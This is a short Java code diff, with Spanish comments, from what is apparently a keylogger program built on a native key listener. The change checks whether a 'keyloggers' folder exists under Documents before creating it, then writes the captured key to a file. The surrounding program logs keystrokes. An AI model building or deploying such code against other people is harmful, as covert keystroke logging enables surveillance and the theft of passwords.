@@ -126,8 +126,15 @@ public class Main implements NativeKeyListener {
                     "Documents",
                     "keyloggers");
             File directory = new File(String.valueOf(folderPath));
-            boolean created = directory.mkdir();
-            if(created) folderCreated = created;
+            boolean isExist = directory.isDirectory();
+            if(!isExist){
+                // No existe el directorio
+                boolean created = directory.mkdir();
+                if(created) folderCreated = created;
+            }else{
+                folderCreated = true;
+            }
+            // Si sí, se salta la creación
             updateFile(key);
         }
 
